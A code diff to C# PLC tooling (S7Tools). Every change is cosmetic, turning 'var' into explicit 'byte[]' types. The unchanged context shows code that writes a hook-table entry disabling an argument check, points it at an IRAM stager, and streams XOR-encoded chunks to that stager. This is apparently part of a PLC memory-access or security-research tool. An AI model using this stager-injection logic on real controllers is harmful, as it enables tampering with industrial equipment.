@@ -29,10 +29,10 @@ namespace S7Tools.Services.Adapters.Plc
             // Hook Entry Structure: [Unknown:2] [ArgCheck:2] [Address:4]
             // We write at Offset + 2 to skip Unknown.
             // Payload: [0x00, 0xFF] (Disable Arg Check) + [Address (Big Endian)]
-            var hookPayload = new byte[6];
+            byte[] hookPayload = new byte[6];
             hookPayload[0] = 0x00;
             hookPayload[1] = 0xFF;
-            var addrBytes = PlcInternalHelpers.GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
+            byte[] addrBytes = PlcInternalHelpers.GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
             Array.Copy(addrBytes, 0, hookPayload, 2, 4);
 
             uint hookEntryAddr = PlcConstants.ADD_HOOK_TABLE_START + (8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND) + 2;
@@ -46,7 +46,7 @@ namespace S7Tools.Services.Adapters.Plc
         {
             // 1. Write Hook Entry
             // Ref StagerManager L174
-            var hookEntry = new byte[8];
+            byte[] hookEntry = new byte[8];
             hookEntry[3] = 0xFF; // Variable
             Array.Copy(PlcInternalHelpers.GetBigEndianBytes(targetAddr), 0, hookEntry, 4, 4); // Addr at end
 
@@ -77,12 +77,12 @@ namespace S7Tools.Services.Adapters.Plc
             for (int i = 0; i < msg.Length; i += maxChunk)
             {
                 int size = Math.Min(maxChunk, msg.Length - i);
-                var chunk = msg.Skip(i).Take(size).ToArray();
-                var encoded = PlcInternalHelpers.EncodeWithXor(chunk);
+                byte[] chunk = msg.Skip(i).Take(size).ToArray();
+                byte[] encoded = PlcInternalHelpers.EncodeWithXor(chunk);
 
                 await _protocol.SendPacketAsync(encoded, 8, cancellationToken: cancellationToken).ConfigureAwait(false);
                 // Ack
-                var ack = await _protocol.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
+                byte[] ack = await _protocol.ReceivePacketAsync(cancellationToken).ConfigureAwait(false);
                 if (ack == null || ack.Length != 1)
                 {
                     throw new Exception("Stager ACK fail");
